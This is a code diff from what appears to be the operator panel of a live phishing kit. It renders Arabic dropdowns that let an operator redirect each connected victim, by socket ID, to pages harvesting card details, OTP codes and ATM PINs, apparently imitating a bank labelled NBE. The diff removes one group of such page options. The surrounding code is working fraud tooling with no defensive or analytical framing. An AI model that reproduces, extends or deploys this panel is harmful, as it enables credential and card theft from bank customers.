@@ -1976,13 +1976,6 @@
       html += '<option value="atm-nbe">رمز ATM</option>';
       html += '<option value="final-nbe">الصفحة النهائية</option>';
       html += '</optgroup>';
-      html += '<optgroup label="صفحات أخرى">';
-      html += '<option value="summary-payment">ملخص الدفع</option>';
-      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
-      html += '<option value="otp-verification">OTP البطاقة</option>';
-      html += '<option value="atm-password">كلمة مرور ATM</option>';
-      html += '<option value="final-page">الصفحة النهائية (قديمة)</option>';
-      html += '</optgroup>';
       html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
@@ -2615,13 +2608,6 @@
       html += '<option value="otp-nbe">رمز التحقق OTP</option>';
       html += '<option value="atm-nbe">رمز ATM</option>';
       html += '<option value="final-nbe">الصفحة النهائية</option>';
-      html += '</optgroup>';
-      html += '<optgroup label="صفحات أخرى">';
-      html += '<option value="summary-payment">ملخص الدفع</option>';
-      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
-      html += '<option value="otp-verification">OTP البطاقة</option>';
-      html += '<option value="atm-password">كلمة مرور ATM</option>';
-      html += '<option value="final-page">الصفحة النهائية (قديمة)</option>';
       html += '</optgroup>';
       html += '</select>';
       html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
